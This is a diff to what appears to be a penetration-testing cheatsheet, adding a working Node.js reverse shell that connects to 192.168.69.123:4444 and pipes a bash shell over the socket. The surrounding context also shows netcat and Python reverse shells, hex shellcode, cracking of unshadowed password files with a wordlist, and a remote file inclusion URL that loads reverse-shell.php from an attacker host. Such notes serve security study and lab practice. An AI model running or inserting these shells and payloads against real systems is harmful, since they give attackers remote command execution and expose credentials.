@@ -56,7 +56,6 @@ unshadow demo-passwd demo-shadow > demo-unshadow
 john demo-unshadow --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-
 # Cheatsheets - Shells
 ## Table of Contents
 * [Bind Shells](#bind-shells)
@@ -66,7 +65,8 @@ john demo-unshadow --wordlist=/usr/share/wordlists/rockyou.txt
   * [Msfvenom](#msfvenom-reverse-shells)
   * [Netcat](#netcat-reverse-shells)
   * [PowerShell](#powershell-reverse-shells)
-  * [Python](#python-reverse-shells) 
+  * [Python](#python-reverse-shells)
+  * [JavaScript](#javascript-reverse-shells)
 * [Upgrade to a PTY Shell](#upgrade-to-a-pty-shell)
   * [Python PTY Shell](#python-pty-shell) 
 
@@ -109,6 +109,22 @@ nc -nv 10.10.10.10 443 -e "/bin/bash"
 export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 ```
 
+#### JavaScript Reverse Shells
+```javascript
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/bash", []);
+    var client = new net.Socket();
+    client.connect(4444, "192.168.69.123", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+```
+
 ## Upgrade to a PTY Shell
 #### Python PTY Shell
 ```bash
@@ -116,15 +132,11 @@ echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
 python /tmp/shell.py
 ```
 
-
-
 ## Generating a String of Non-Repeating Characters
 ```bash
 msf-pattern_create -l 1000 # print a string of 1000 non-repeating characters
 msf-pattern_create -l 1000 -q 12345678 # get the number of bytes required to get to this offset
 ```
-
-
 
 ## Finding Opcodes
 ```bash
@@ -164,7 +176,6 @@ shell = (
     "\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
 )
 ```
-
 
 # Cheatsheet - Buffer Overflows (BOF)
 ## Immunity Debugger
@@ -334,7 +345,6 @@ Warning: fclose() expects parameter 1 to be resource, bool given in C:\xampp\htd
 
 To upgrade your shell to a fully-functional PTY on Windows, try using nc.exe instead of a Msfvenom reverse shell.
 
-
 # Cheatsheets - PHP
 ## Table of Contents
 * [Basic PHP Read-Eval-Print-Loop](#basic-php-read-eval-print-loop)
@@ -388,7 +398,6 @@ sudo python3 -m http.server 80 # terminal 2
 # an 'include' statement in the targeted web app's PHP code (other parameter examples: page, cmd, etc.)
 firefox http://victim.edu/index.php?file=http://hacker.edu/reverse-shell.php
 ```
-
 
 # Cheatsheets - SQL Injection
 ## Table of Contents
